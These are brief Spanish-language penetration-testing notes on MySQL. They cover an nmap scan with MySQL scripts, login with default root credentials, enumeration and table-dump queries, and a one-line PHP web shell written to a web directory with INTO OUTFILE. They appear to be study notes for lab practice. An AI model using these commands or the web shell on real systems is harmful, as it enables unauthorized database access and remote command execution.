
### Scan

    sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

### Conectar

    mysql -u root -p'root' -h 192.168.50.16 -P 3306 --ssl=FALSE

### Version

    select version();

### Ver dbs

    show databases;

### Ver tablas

    show tables;

### Dumpear datos de una tabla

    select * from <tabla>

si somos DBA y sabemos cómo acceder a los archivos desde un servicio web, podemos crear una shell:
SELECT '<?php system($_GET[1]); ?>' INTO OUTFILE 'path_to_file';



el resto en:
https://github.com/LaPorota/LaPorota_suite/blob/main/sqli
